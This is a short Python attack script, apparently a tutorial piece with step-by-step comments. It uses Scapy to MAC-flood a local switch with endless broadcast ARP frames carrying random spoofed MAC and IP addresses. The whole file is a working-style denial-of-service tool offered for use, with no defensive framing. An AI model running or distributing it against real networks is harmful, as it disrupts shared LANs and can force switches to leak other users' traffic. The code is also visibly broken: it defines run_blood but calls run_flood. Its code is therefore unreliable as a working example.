import scapy.all as scapy  # For packaging production and launching
import time # For packet speed settings

class MacFlooder:
    def __init__(self, interface):
        self.interface = interface # Which network interface to use (eth0, wlan0, etc.)
    
    def run_blood(self):
        """
        Sends thousands of fake MAC addresses to confuse the switch/router.
        Modemin hafiza defterini felc eder.
        """
        print(f"[*] Starting MAC Flood attack on interface: {self.interface}")
        print("[*] Press CTRL+C to stop")
        
        packet_count = 0
        try:
            while True:
                # STEP 1: We prepare a completely fake and random envelope.
                # src=scapy.RandMAC(): The sender uses a fake MAC address each time.
                # dst="ff:ff:ff:ff:ff:ff": Send to everyone (Broadcast).
                fake_ether = scapy.Ether(src=scapy.RandMAC(), dst="ff:ff:ff:ff:ff:ff")
                
                # STEP 2: We place a fake IP letter inside the envelope.
                # psrc=scapy.RandIP(): The sender IP is completely fabricated.
                # pdst="255.255.255.255": Broadcast IP address.
                fake_arp = scapy.ARP(psrc=scapy.RandIP(), pdst="255.255.255.255")
                
                # STEP 3: We are merging the layers.
                final_packet = fake_ether / fake_arp
                
                # STEP 4: We send the packet from the network interface card at Layer 2 (using sendp).
                # iface: Tells Scapy which network interface (Wi-Fi/Wired) to use.
                scapy.sendp(final_packet, iface=self.interface, verbose=False)
                
                packet_count +=1
                if packet_count %100 == 0:
                    print(f"[+] Sent {packet_count} fake packets...")
                    
                # We are pausing for a very brief moment to prevent our network card from locking up.
                time.sleep(0.001)
                
        except KeyboardInterrupt:
            print(f"\n[!] Attack Stopped. Total packets sent: {packet_count}")
            
if __name__ == "__main__":
    # If you are using Kali Linux or Linux, you typically enter "eth0" or "wlan0".
    # If you are using Windows, Scapy automatically selects the exact name of the network card; you can also leave this field blank.
    network_card = None
    
    flooder = MacFlooder(network_card)
    flooder.run_flood()                    